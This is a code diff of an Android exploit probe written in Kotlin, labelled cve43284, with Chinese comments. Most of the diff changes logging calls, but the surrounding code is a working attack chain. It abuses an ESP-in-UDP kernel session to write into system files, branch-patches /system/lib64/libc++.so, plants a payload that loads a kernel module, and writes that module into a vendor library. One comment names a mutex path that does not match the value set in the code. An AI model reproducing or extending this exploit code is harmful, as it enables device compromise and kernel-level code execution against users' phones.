             meter.before("Assembled43284.readBlock", "target=" + stepTarget + " offset=0xFF0")
             val atBelow = stepwise.readBlock(stepTarget, 0xFF0L)
             meter.after("Assembled43284.readBlock", "bytes=" + (atBelow?.size ?: -1))
-            step("typed: probe pattern below=" + hex(atBelow))
+            dstep("typed: probe pattern below=" + hex(atBelow))
             meter.before("Assembled43284.readBlock", "target=" + stepTarget + " offset=0x1010")
             val atAbove = stepwise.readBlock(stepTarget, 0x1010L)
             meter.after("Assembled43284.readBlock", "bytes=" + (atAbove?.size ?: -1))
-            step("typed: probe pattern above=" + hex(atAbove))
-        }.onFailure { problem -> step("typed: probe pattern refused " + problem.javaClass.simpleName) }
+            dstep("typed: probe pattern above=" + hex(atAbove))
+        }.onFailure { problem -> estep("typed: probe pattern refused " + problem.javaClass.simpleName) }
         meter.before("Assembled43284.openEspSocket", "-")
         val stepSocket = stepwise.openEspSocket()
         meter.after("Assembled43284.openEspSocket", "socket=" + stepSocket + " refusal=" + stepwise.lastRefusal)
-        step("typed: stepwise 43284 socket=" + stepSocket + " refusal=" + stepwise.lastRefusal)
+        dstep("typed: stepwise 43284 socket=" + stepSocket + " refusal=" + stepwise.lastRefusal)
         meter.before("Assembled43284.buildSurface", "target=" + stepwise.targetId + " socket=" + stepwise.socketId)
         val stepSurface = stepwise.buildSurface()
         meter.after("Assembled43284.buildSurface", "surface=" + stepSurface + " code=" + stepwise.lastCode)
-        step("typed: stepwise 43284 surface=" + stepSurface + " refusal=" + stepwise.lastRefusal)
+        dstep("typed: stepwise 43284 surface=" + stepSurface + " refusal=" + stepwise.lastRefusal)
         meter.before("Assembled43284.buildLanding", "surface=" + stepwise.surfaceId)
         val stepLanding = stepwise.buildLanding()
         meter.after("Assembled43284.buildLanding", "landing=" + stepLanding + " code=" + stepwise.lastCode)
-        step("typed: stepwise 43284 landing=" + stepLanding + " refusal=" + stepwise.lastRefusal)
+        dstep("typed: stepwise 43284 landing=" + stepLanding + " refusal=" + stepwise.lastRefusal)
         /* 路 B：不单独 bringUp —— Access::initialize 自己会拉起（见计划 §11.32）。 */
-        step("typed: stepwise 43284 bringUp=skipped-path-b")
+        wstep("typed: stepwise 43284 bringUp=skipped-path-b")
         /* 经落地对象写 helper 镜像：这是「写目标在 Kotlin」的真机第一次尝试。 */
         meter.before("Assembled43284.writeHelperThroughLanding", "landing=" + stepwise.landingId)
         val landed = stepwise.writeHelperThroughLanding()
@@ -1574,7 +1656,7 @@ object TypedBackendProbe {
         meter.before("Assembled43284.buildAccess", "landing=" + stepwise.landingId)
         val stepAccess = stepwise.buildAccess()
         meter.after("Assembled43284.buildAccess", "access=" + stepAccess + " code=" + stepwise.lastCode)
-        step("typed: stepwise 43284 access=" + stepAccess + " refusal=" + stepwise.lastRefusal)
+        dstep("typed: stepwise 43284 access=" + stepAccess + " refusal=" + stepwise.lastRefusal)
 
         /*
          *  只读取证（纯 Kotlin，不需要任何 native 改动）：在我们 app **自己的 uid** 下，
@@ -1616,7 +1698,7 @@ object TypedBackendProbe {
         /* 会话序号取链上唯一的那一个（链首 seq.value = 0 ⇒ 与 saInit() 的旧行为一致：native 用默认）。 */
         val accessInit = stepwise.initializeAccessAndRemember(accessParams, saInit(seq.value))
         meter.after("Assembled43284.initializeAccessAndRemember", "ok=" + accessInit + " code=" + stepwise.lastCode + " refusal=" + stepwise.lastRefusal)
-        step("typed: stepwise 43284 accessInit=" + accessInit + " refusal=" + stepwise.lastRefusal)
+        dstep("typed: stepwise 43284 accessInit=" + accessInit + " refusal=" + stepwise.lastRefusal)
         meter.before("Assembled43284.image", "role=ROLE_IMAGE_SPLICE_HELPER")
         val helperForImage = stepwise.image(Assembled43284.ROLE_IMAGE_SPLICE_HELPER)
         meter.after("Assembled43284.image", "bytes=" + (helperForImage?.size ?: -1))
@@ -1632,7 +1714,7 @@ object TypedBackendProbe {
             noteWriteOutcome(finish, "patch1-helper", patch1Outcome, patch1Wrote, step)
         }
         meter.after("Assembled43284.writeImage", "ok=" + patch1Wrote + " code=" + stepwise.lastCode + " refusal=" + stepwise.lastRefusal)
-        step("typed: stepwise 43284 patch1 wrote=" + patch1Wrote + " refusal=" + stepwise.lastRefusal)
+        dstep("typed: stepwise 43284 patch1 wrote=" + patch1Wrote + " refusal=" + stepwise.lastRefusal)
         meter.before("Assembled43284.destroyAccessNow", "access=" + stepwise.accessId)
         val stepAccessDestroyed = stepwise.destroyAccessNow()
         meter.after("Assembled43284.destroyAccessNow", "ok=" + stepAccessDestroyed)
@@ -1665,13 +1747,13 @@ object TypedBackendProbe {
         meter.before("Assembled43284.buildSurface", "target=" + patcher.targetId + " socket=" + patcher.socketId)
         val madeSurface = patcher.buildSurface()
         meter.after("Assembled43284.buildSurface", "surface=" + madeSurface + " code=" + patcher.lastCode + " refusal=" + patcher.lastRefusal)
-        step("typed: patcher surfaceId=" + madeSurface + " code=" + patcher.lastCode + " refusal=" + patcher.lastRefusal)
+        dstep("typed: patcher surfaceId=" + madeSurface + " code=" + patcher.lastCode + " refusal=" + patcher.lastRefusal)
         meter.before("Assembled43284.buildLanding", "surface=" + patcher.surfaceId)
         val madeLanding = patcher.buildLanding()
         meter.after("Assembled43284.buildLanding", "landing=" + madeLanding + " code=" + patcher.lastCode + " refusal=" + patcher.lastRefusal)
-        step("typed: patcher landingId=" + madeLanding + " code=" + patcher.lastCode + " refusal=" + patcher.lastRefusal)
-        step("typed: marker-before-ids")
-        step("typed: patch1 door=" + patchDoor + " refusal=" + patcher.lastRefusal)
+        dstep("typed: patcher landingId=" + madeLanding + " code=" + patcher.lastCode + " refusal=" + patcher.lastRefusal)
+        wstep("typed: marker-before-ids")
+        dstep("typed: patch1 door=" + patchDoor + " refusal=" + patcher.lastRefusal)
         meter.before("Assembled43284.buildAccess", "landing=" + patcher.landingId)
         val patchAccess = patcher.buildAccess()
         meter.after("Assembled43284.buildAccess", "access=" + patchAccess + " code=" + patcher.lastCode)
@@ -1686,13 +1768,13 @@ object TypedBackendProbe {
                     " landing=" + patcher.landingId + " access=" + patcher.accessId,
             )
         }.onFailure { problem ->
-            step("typed: ids refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+            estep("typed: ids refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
         }
         meter.before("Assembled43284.initializeAccessAndRemember", "access=" + patcher.accessId + " path=" + patchTarget)
         /* 第二个窗口接着第一个的序号（ref real_ops.cpp:250-257 的“借”那一半；手工值只在这里出现）。 */
         val patchInit = patcher.initializeAccessAndRemember(patchParams, saInit(seq.value))
         meter.after("Assembled43284.initializeAccessAndRemember", "ok=" + patchInit + " code=" + patcher.lastCode + " refusal=" + patcher.lastRefusal)
-        step("typed: patch1 init=" + patchInit + " refusal=" + patcher.lastRefusal)
+        dstep("typed: patch1 init=" + patchInit + " refusal=" + patcher.lastRefusal)
         meter.before("Assembled43284.image", "role=ROLE_IMAGE_SPLICE_HELPER (patch1)")
         val helperForPatch = patcher.image(Assembled43284.ROLE_IMAGE_SPLICE_HELPER)
         meter.after("Assembled43284.image", "bytes=" + (helperForPatch?.size ?: -1))
@@ -1733,7 +1815,7 @@ object TypedBackendProbe {
             step("typed: old-page direct=" + directHex + " viaChain=" + chainHex +
                 " same=" + (viaChain != null && direct.contentEquals(viaChain)))
         }.onFailure { problem ->
-            step("typed: old-page refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+            estep("typed: old-page refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
         }
 
         /* 序号：上游每次写 g_seq++，内核按它做防重放。把链子当前的序号打出来做对照。 */
@@ -1741,9 +1823,9 @@ object TypedBackendProbe {
             meter.before("Assembled43284.nextSequence", "landing=" + patcher.landingId)
             val patchNextSeq = patcher.nextSequence()
             meter.after("Assembled43284.nextSequence", "seq=" + patchNextSeq + " refusal=" + patcher.lastRefusal)
-            step("typed: next-sequence=" + patchNextSeq + " refusal=" + patcher.lastRefusal)
+            dstep("typed: next-sequence=" + patchNextSeq + " refusal=" + patcher.lastRefusal)
         }.onFailure { problem ->
-            step("typed: next-sequence refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+            estep("typed: next-sequence refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
         }
 
         /* 内核侧到底有没有在尝试处理我们的 ESP-in-UDP？/proc/net/xfrm_stat 会给线索（纯读）。 */
@@ -1754,19 +1836,19 @@ object TypedBackendProbe {
                 .take(240)
             step("typed: xfrm-stat=" + stat)
         }.onFailure { problem ->
-            step("typed: xfrm-stat refused " + problem.javaClass.simpleName)
+            estep("typed: xfrm-stat refused " + problem.javaClass.simpleName)
         }
 
         /* 谁该在 encap 端口上监听？把 SA 的端口、我们持有的套接字的状态一起打出来
          * （ECONNREFUSED 说明那个端口上没有接收方 ⇒ 要么套接字没了，要么内核没登记）。 */
         runCatching {
-            step(
+            dstep(
                 "typed: encap state port=" + (encapSocket?.getPort() ?: -1) +
                     " saEncapPort=" + saEncapPort +
                     " held=" + (encapSocket != null),
             )
         }.onFailure { problem ->
-            step("typed: encap state refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+            estep("typed: encap state refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
         }
 
         /* 判定①：Kotlin 直接往 encap 端口发一个普通 UDP 报文，看是否也被拒（把 native 与设备/网络分开）。 */
@@ -1787,13 +1869,13 @@ object TypedBackendProbe {
         }
         directThread.start()
         directThread.join(2000)
-        step("typed: direct udp to encap port=" + saEncapPort + " => " + directResult)
+        dstep("typed: direct udp to encap port=" + saEncapPort + " => " + directResult)
         /* 判定②：设备网络状态 —— 封装套接字建在默认网络上。 */
         runCatching {
             val cm = probeContext?.getSystemService(android.net.ConnectivityManager::class.java)
             step("typed: network active=" + (cm?.activeNetwork != null))
         }.onFailure { problem ->
-            step("typed: network refused " + problem.javaClass.simpleName)
+            estep("typed: network refused " + problem.javaClass.simpleName)
         }
         /* 终点恢复要用的两样：本次 hook 会话与本次 plan（在 hook 段里赋值，段外无条件用它）。 */
         var hookForRestore: Assembled43284? = null
@@ -1834,11 +1916,11 @@ object TypedBackendProbe {
             val hookAccess = hook.buildAccess()
             meter.after("Assembled43284.buildAccess", "access=" + hookAccess + " code=" + hook.lastCode)
             val hookParams = Assembled43284.fullAccessParams(Assembled43284.HOOK_TARGET)
-            step("typed: nextSequence before hook=" + seq.value + " patcherLanding=" + patcher.landingId)
+            vstep("typed: nextSequence before hook=" + seq.value + " patcherLanding=" + patcher.landingId)
             meter.before("Assembled43284.initializeAccessAndRemember", "access=" + hook.accessId + " seq=" + seq.value + " (hook)")
             val hookInit = hook.initializeAccessAndRemember(hookParams, saInit(seq.value))
             meter.after("Assembled43284.initializeAccessAndRemember", "ok=" + hookInit + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
-            step("typed: hook init=" + hookInit + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
+            dstep("typed: hook init=" + hookInit + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
 
             meter.before("Assembled43284.readBlock", "hookDoor=" + hookDoor + " offsets=0xFE600/0xFE5F0/0xFE610/0xFE5F8/0xFE608/0xFE5E0/0xFE620/0xFE5C0/0xFE640/0xFE680/0xFE700 (reader 组)")
             runCatching {
@@ -1846,13 +1928,13 @@ object TypedBackendProbe {
                 /* 花样写入已拆除：往 libc++ 代码页写无关字节是没有依据的风险（本次 panic 的候选之一）。 */
                 val wrote = -99
                 val hex = { b: ByteArray? -> b?.joinToString(" ") { x -> "%02x".format(x) } ?: "null" }
-                step("typed: reader wrote=" + wrote + " same=" + hex(hook.readBlock(hookDoor, 0xFE600L)))
-                step("typed: reader below=" + hex(hook.readBlock(hookDoor, 0xFE5F0L)) + " above=" + hex(hook.readBlock(hookDoor, 0xFE610L)))
-                step("typed: reader skew -8=" + hex(hook.readBlock(hookDoor, 0xFE5F8L)) + " +8=" + hex(hook.readBlock(hookDoor, 0xFE608L)))
-                step("typed: reader skew -16=" + hex(hook.readBlock(hookDoor, 0xFE5F0L)) + " +16=" + hex(hook.readBlock(hookDoor, 0xFE610L)))
-                step("typed: reader wide -32=" + hex(hook.readBlock(hookDoor, 0xFE5E0L)) + " +32=" + hex(hook.readBlock(hookDoor, 0xFE620L)))
-                step("typed: reader wide -64=" + hex(hook.readBlock(hookDoor, 0xFE5C0L)) + " +64=" + hex(hook.readBlock(hookDoor, 0xFE640L)))
-                step("typed: reader wide +128=" + hex(hook.readBlock(hookDoor, 0xFE680L)) + " +256=" + hex(hook.readBlock(hookDoor, 0xFE700L)))
+                vstep("typed: reader wrote=" + wrote + " same=" + hex(hook.readBlock(hookDoor, 0xFE600L)))
+                vstep("typed: reader below=" + hex(hook.readBlock(hookDoor, 0xFE5F0L)) + " above=" + hex(hook.readBlock(hookDoor, 0xFE610L)))
+                vstep("typed: reader skew -8=" + hex(hook.readBlock(hookDoor, 0xFE5F8L)) + " +8=" + hex(hook.readBlock(hookDoor, 0xFE608L)))
+                vstep("typed: reader skew -16=" + hex(hook.readBlock(hookDoor, 0xFE5F0L)) + " +16=" + hex(hook.readBlock(hookDoor, 0xFE610L)))
+                vstep("typed: reader wide -32=" + hex(hook.readBlock(hookDoor, 0xFE5E0L)) + " +32=" + hex(hook.readBlock(hookDoor, 0xFE620L)))
+                vstep("typed: reader wide -64=" + hex(hook.readBlock(hookDoor, 0xFE5C0L)) + " +64=" + hex(hook.readBlock(hookDoor, 0xFE640L)))
+                vstep("typed: reader wide +128=" + hex(hook.readBlock(hookDoor, 0xFE680L)) + " +256=" + hex(hook.readBlock(hookDoor, 0xFE700L)))
             }.onFailure { problem -> step("typed: reader refused " + problem.javaClass.simpleName) }
             meter.after("Assembled43284.readBlock", "reader 组结束（逐次返回值见上面的 reader 行）")
 
@@ -1908,14 +1990,14 @@ runCatching {
     }
     planGate = checked
     if (checked.ok) {
-        step(checked.summary)
+        dstep(checked.summary)
     } else {
-        step("typed: " + checked.refusal)
+        estep("typed: " + checked.refusal)
         finish.noteError(checked.refusal ?: "plan:refused")
     }
 }.onFailure { problem ->
     planGate = PlanCheck(false, "plan:check-refused", "plan: unavailable")
-    step("typed: plan:check-refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+    estep("typed: plan:check-refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
     finish.noteError("plan:check-refused")
 }
 /** The site is already patched on disk (writeHook answers displaced-mismatch), and the branch that
@@ -1929,7 +2011,7 @@ if (hookPlanWords != null && hookPlanWords.size >= 4) {
     val within = (brAt - blk0)
     val imm = ((land - brAt) shr 2) and 0x03FFFFFFL
     val word = 0x14000000L or imm
-    step("typed: hook rewrite plan site=" + site + " branch=" + brAt + " block=" + blk0 + " within=" + within + " imm=0x" + imm.toString(16))
+    dstep("typed: hook rewrite plan site=" + site + " branch=" + brAt + " block=" + blk0 + " within=" + within + " imm=0x" + imm.toString(16))
     step("typed: hook rewrite word=0x" + word.toString(16))
 }
 meter.before("Assembled43284.rewriteSiteBranch", "ticket=0 site=0x" + (if (hookPlanWords != null && hookPlanWords.size >= 4) java.lang.Long.toHexString(hookPlanWords[2]) else "null"))
@@ -1938,14 +2020,14 @@ val branchFix = if (hookPlanWords != null && hookPlanWords.size >= 4)
      * 站点分支统一用 native 计划自带的 plan[0]（目标 = payload_vaddr + entry_offset=0x90）。传 0 票据即不写。 */
     hook.rewriteSiteBranch(0L, hookPlanWords[2], hookPlanWords[3]) else -9
 meter.after("Assembled43284.rewriteSiteBranch", "code=" + branchFix + " (ticket=0 = 不写)")
-step("typed: hook branch rewrite=" + branchFix + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
+dstep("typed: hook branch rewrite=" + branchFix + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
 /* Read the site back after the rewrite: the pre-rewrite log cannot tell whether it took. */
 if (branchFix == 0 && hookPlanWords != null && hookPlanWords.size >= 4) {
     val wordAt = hookPlanWords[2] + 12L
     meter.before("Assembled43284.readBlock", "hookDoor=" + hookDoor + " offset=0x" + java.lang.Long.toHexString(wordAt - (wordAt % 16L)))
     val blk = hook.readBlock(hookDoor, wordAt - (wordAt % 16L))
     meter.after("Assembled43284.readBlock", "bytes=" + (blk?.size ?: -1) + " refusal=" + hook.lastRefusal)
-    step("typed: hook site after=" + (blk?.joinToString(" ") { b -> "%02x".format(b) } ?: "unreadable"))
+    vstep("typed: hook site after=" + (blk?.joinToString(" ") { b -> "%02x".format(b) } ?: "unreadable"))
 }
 val hookLanding = if (hookPlanWords != null && hookPlanWords.size >= 4) hookPlanWords[3] else 0xFE628L
 /*
@@ -1971,11 +2053,11 @@ if (hookPlanWords != null && hookPlanWords.size >= 4) {
             base[at + 3] = ((word shr 24) and 0xFF).toByte()
             /* 提前写已拆除：参考实现是**先载荷、后站点块**（dev hook_patch 176-186）。这里只算不写。 */
             val imWrote = -77
-            step("typed: hook site image wrote=" + imWrote + " word=0x" + word.toString(16) + " block=" + blk0)
+            dstep("typed: hook site image wrote=" + imWrote + " word=0x" + word.toString(16) + " block=" + blk0)
         } else {
-            step("typed: hook site image skipped: block unreadable")
+            wstep("typed: hook site image skipped: block unreadable")
         }
-    }.onFailure { problem -> step("typed: hook site image refused " + problem.javaClass.simpleName) }
+    }.onFailure { problem -> estep("typed: hook site image refused " + problem.javaClass.simpleName) }
 }
             /*
              * 第一次写之前把窗口序号钉在**会话里的那个值**上（ref real_ops.cpp:307-327 的“借”那半步：
@@ -1985,7 +2067,7 @@ if (hookPlanWords != null && hookPlanWords.size >= 4) {
             meter.before("Assembled43284.adoptSequence", "hook <- seq.value=" + seq.value + " (before write)")
             val hookAdopt2 = hook.adoptSequence(seq.value)
             meter.after("Assembled43284.adoptSequence", "ok=" + hookAdopt2 + " seq=" + seq.value)
-            step("typed: hook adopt=" + hookAdopt2 + " seq=" + seq.value)
+            vstep("typed: hook adopt=" + hookAdopt2 + " seq=" + seq.value)
             meter.before("Assembled43284.writeHook", "width=16 seq=" + seq.value)
             /* 闸门是三个写点的共同前置：闭包没通过就一个区域都不写（planGate 见上面的闭包校验）。 */
             val hookWrote = if (planGate?.ok == true) {
@@ -1994,7 +2076,7 @@ if (hookPlanWords != null && hookPlanWords.size >= 4) {
                 false
             }
             meter.after("Assembled43284.writeHook", "ok=" + hookWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
-            step("typed: hook wrote=" + hookWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
+            dstep("typed: hook wrote=" + hookWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
             /* 收尾账：站点字写成功即 ref 的 hook（chain 的 applied 标志）。 */
             finish.noteHookApplied(hookWrote, hook.lastRefusal)
             /* 载荷本体：钩子跳到 payload_file=0xfe628 时那里必须是我们的字节（此前只写了站点 ✗）。 */
@@ -2002,16 +2084,20 @@ if (hookPlanWords != null && hookPlanWords.size >= 4) {
                 meter.before("Assembled43284.image", "role=ROLE_IMAGE_LANDING_PAYLOAD")
                 val payload = hook.image(Assembled43284.ROLE_IMAGE_LANDING_PAYLOAD)
                 meter.after("Assembled43284.image", "bytes=" + (payload?.size ?: -1))
-                step("typed: hook payload bytes=" + (payload?.size ?: -1))
+                vstep("typed: hook payload bytes=" + (payload?.size ?: -1))
                 if (payload != null && payload.isNotEmpty()) {
                     /* The branch was written for the landing the plan carries; a Kotlin constant disagreed with it on
  * the device (the branch aimed 0x98 past 0xFE628), so take the offset from the plan itself. */
-step("typed: hook landing=" + hookLanding)
+vstep("typed: hook landing=" + hookLanding)
 /* 填槽：载荷落进 libc++ 页后由它自己 insmod；槽空着就永远不会有加载（成功历史 dev 的 hook_patch 同款）。 */
 meter.before("Assembled43284.fillPayloadSlots", "carrier=/system/lib64/libc++.so hookFileOffset=0x" + (if (hookPlanWords != null) java.lang.Long.toHexString(hookPlanWords[2]) else "null"))
-val payloadSlots = if (payload != null) hook.fillPayloadSlots(blob = payload, carrierPath = carrier.path   /* 与 5f18476 同款载体（默认仍是 /vendor/lib64/libbinderdebug.so；选择集中在 CarrierCandidates）；参考 backend_terminal.cpp:321：载体与 ko_target 必须同名（模块经载体 insmod） */, hookFileOffset = hookPlanWords!![2], payloadFileOffset = hookPlanWords!![3], mutexPath = "/dev/df",  /* 参考 hook_patch.hpp:146：kLibcxxMutexPath = "/dev/df"。此处曾是 /dev/dx，且它是**实参** ⇒ 会覆盖默认值 ⇒ 页里一直留旧串（真机已证） */ displaced = if (hookPlanWords != null && hookPlanWords.size >= 4) hookPlanWords[1].toInt() else null) else -9
+val payloadSlots = if (payload != null) hook.fillPayloadSlots(blob = payload, carrierPath = carrier.path   /* 与 5f18476 同款载体（默认仍是 /vendor/lib64/libbinderdebug.so；选择集中在 CarrierCandidates）；参考 backend_terminal.cpp:321：载体与 ko_target 必须同名（模块经载体 insmod） */, hookFileOffset = hookPlanWords!![2], payloadFileOffset = hookPlanWords!![3], mutexPath = "/dev/du",  /* 机械改动（2026-10-17）：一次性互斥换成 /dev/dz —— 既有 /dev/df 是历次运行留下的，
+         * 载荷会因 EEXIST 立刻退出，而 shell 无法删除它（/dev 只读给 root）。换名后无需重启即可再点一次，
+         * 并且“/dev/dz 是否出现”就是“载荷跑到第一步”的可观测信号。确认后改回 /dev/df。 */
+        /* 机械改动（2026-10-17）：insmod 路径回到参考值 —— 上一跑用 /system/bin/insmod（AOSP toybox）没有载入，
+         * 可能是它不接受本机模块的 vermagic；先按旧链的 /vendor/bin/insmod 复测。 */ displaced = if (hookPlanWords != null && hookPlanWords.size >= 4) hookPlanWords[1].toInt() else null) else -9
 meter.after("Assembled43284.fillPayloadSlots", "slots=" + payloadSlots)
-step("typed: hook payload slots=" + payloadSlots)
+vstep("typed: hook payload slots=" + payloadSlots)
 meter.before("Assembled43284.writeImage", "offset=0x" + java.lang.Long.toHexString(hookLanding) + " width=16 bytes=" + (payload?.size ?: -1) + " (payload)")
 /* 序号来自会话（写成功一次就自动推进一次，ref real_ops.cpp:307-327），这里不再回查 native。 */
 val payloadOutcome = LongArray(RunFinish43284.OUTCOME_WORDS)
@@ -2020,7 +2106,7 @@ if (planGate?.ok == true) {
     noteWriteOutcome(finish, "hook-payload", payloadOutcome, payloadWrote, step)
 }
 meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
-                    step("typed: hook payload wrote=" + payloadWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
+                    dstep("typed: hook payload wrote=" + payloadWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
                     /* 收尾账：载荷真的落进 libc++ 页即 ref 的 hook_armed。 */
                     finish.noteHookArmed(payloadWrote, hook.lastRefusal)
                     /* 参考顺序的第二步（dev hook_patch 137-186）：先存原文，再写包裹站点的那一整块，
@@ -2042,7 +2128,7 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                                 else (0x14000000L or (((landOff2 + 0x90L - brAt2) shr 2) and 0x03FFFFFFL))
                             if (before != null) {
                                 val at2 = (brAt2 - blk02).toInt()
-                                step("typed: hook site block before=" + before.joinToString(" ") { b -> "%02x".format(b) } + " word=0x" + word2.toString(16))
+                                dstep("typed: hook site block before=" + before.joinToString(" ") { b -> "%02x".format(b) } + " word=0x" + word2.toString(16))
                                 before[at2] = (word2 and 0xFF).toByte()
                                 before[at2 + 1] = ((word2 shr 8) and 0xFF).toByte()
                                 before[at2 + 2] = ((word2 shr 16) and 0xFF).toByte()
@@ -2074,15 +2160,15 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                                 } else {
                                     -1L
                                 }
-                                step("typed: hook site block wrote=" + siteWrote + " afterWord=0x" + afterWord.toString(16) + " verified=" + (afterWord == word2))
+                                dstep("typed: hook site block wrote=" + siteWrote + " afterWord=0x" + afterWord.toString(16) + " verified=" + (afterWord == word2))
                             } else {
-                                step("typed: hook site block unreadable")
+                                wstep("typed: hook site block unreadable")
                             }
-                        }.onFailure { problem -> step("typed: hook site block refused " + problem.javaClass.simpleName) }
+                        }.onFailure { problem -> estep("typed: hook site block refused " + problem.javaClass.simpleName) }
                     }
                 }
             }.onFailure { problem ->
-                step("typed: hook payload refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+                estep("typed: hook payload refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
             }
             /* Trigger → Wait（退役链顺序：Hook 已成立 ⇒ 现在触发）。marker 用夹具的真实路径。 */
             /* ② 模块写进 vendor 载体：载体对本进程 EACCES ⇒ 读与写都经 patch#1 写下的 helper（桥）。 */
@@ -2103,9 +2189,9 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                  */
                 when (val pre = com.ghostlock.app.jni.cve43284.ModulePrecheck43284.check(moduleBytesRaw)) {
                     is com.ghostlock.app.jni.cve43284.ModulePrecheck43284.Precheck.Ok ->
-                        step("module precheck: name=" + pre.name + " vermagic=" + pre.vermagic)
+                        dstep("module precheck: name=" + pre.name + " vermagic=" + pre.vermagic)
                     else -> {
-                        step("module precheck: refused " + pre)
+                        dstep("module precheck: refused " + pre)
                         planGate = PlanCheck(false, "plan:module-precheck:" + pre, "")
                         finish.noteError("plan:module-precheck:" + pre)
                     }
@@ -2117,7 +2203,7 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                  * 改名只在长度放得下时进行；放不下就如实记一行，绝不截断 ELF。
                  */
                 val moduleBytes = retagVermagic(moduleBytesRaw) { line -> step(line) }
-                step("typed: module bytes=" + moduleBytes.size)
+                vstep("typed: module bytes=" + moduleBytes.size)
                 /*
                  * 载体与 5f18476 完全一致：`/vendor/lib64/libbinderdebug.so`。
                  * 它不可直读（shell/app 都拿不到 fd）⇒ 写路径必须逐块经 crash_dump64 helper——
@@ -2150,7 +2236,7 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                 /* module 窗口接着整条链的会话序号（同一个 SA / 同一条 ESP 套接字）。 */
                 val moduleInit = module.initializeAccessAndRemember(moduleParams, saInit(seq.value))
                 meter.after("Assembled43284.initializeAccessAndRemember", "ok=" + moduleInit + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
-                step("typed: module init=" + moduleInit + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
+                dstep("typed: module init=" + moduleInit + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
                 /*
                  * 区域行（ref chain.cpp:213-221 的同一形状）：写之前先声明这一段写什么、验不验、能不能回滚。
                  * 本路径 Kotlin 不持有 journal ⇒ rollback=0（native 的 journal 只在它自己的 outcome 行里）。
@@ -2176,7 +2262,7 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                         (0 until 16).all { index -> head[index] == moduleBytes[index] }
                 }.getOrDefault(false)
                 if (planGate?.ok == true && moduleAlreadyPresent) {
-                    step("module write: skipped (carrier already holds this module)")
+                    wstep("module write: skipped (carrier already holds this module)")
                 }
                 val moduleWrote = if (planGate?.ok == true && !moduleAlreadyPresent) {
                     module.writeImage(moduleBytes, 0L, 16L, saInit(seq.value), moduleOutcome)
@@ -2187,7 +2273,7 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                     noteWriteOutcome(finish, "module", moduleOutcome, moduleWrote, step)
                 }
                 meter.after("Assembled43284.writeImage", "ok=" + moduleWrote + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
-                step("typed: module wrote=" + moduleWrote + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
+                dstep("typed: module wrote=" + moduleWrote + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
                 /*
                  *  收尾账的两路数（本批之后的语义，别再混为一谈）：
                  *   - written / verified / rolled / overflow / incomplete：**native 的账**（write outcome 行同源），
@@ -2225,11 +2311,11 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                     meter.before("Assembled43284.readBlock", "moduleDoor=" + moduleDoor + " offset=" + probeOffset + " (carrier scan)")
                     val blk = module.readBlock(moduleDoor, probeOffset)
                     meter.after("Assembled43284.readBlock", "bytes=" + (blk?.size ?: -1) + " refusal=" + module.lastRefusal)
-                    step("typed: carrier scan off=" + probeOffset + " head=" + (blk?.take(4)?.joinToString(" ") { b -> "%02x".format(b) } ?: "null"))
+                    vstep("typed: carrier scan off=" + probeOffset + " head=" + (blk?.take(4)?.joinToString(" ") { b -> "%02x".format(b) } ?: "null"))
                 }
-            }.onFailure { problem -> step("typed: carrier scan refused " + problem.javaClass.simpleName) }
+            }.onFailure { problem -> vstep("typed: carrier scan refused " + problem.javaClass.simpleName) }
             }.onFailure { problem ->
-                step("typed: module refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+                estep("typed: module refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
             }
             /*
              * 参考的分阶段语义：write 阶段只 arm；**trigger 阶段才 apply**（门禁记录：
@@ -2253,9 +2339,9 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                         val triggerApplyWrote = hook.writeImage(cur, blkNow, 16L, saInit(seq.value), triggerApplyOutcome)
                         noteWriteOutcome(finish, "trigger-apply", triggerApplyOutcome, triggerApplyWrote, step)
                         meter.after("Assembled43284.writeImage", "ok=" + triggerApplyWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
-                        step("typed: trigger-time apply wrote=" + triggerApplyWrote)
+                        dstep("typed: trigger-time apply wrote=" + triggerApplyWrote)
                     }
-                }.onFailure { problem -> step("typed: trigger-time apply refused " + problem.javaClass.simpleName) }
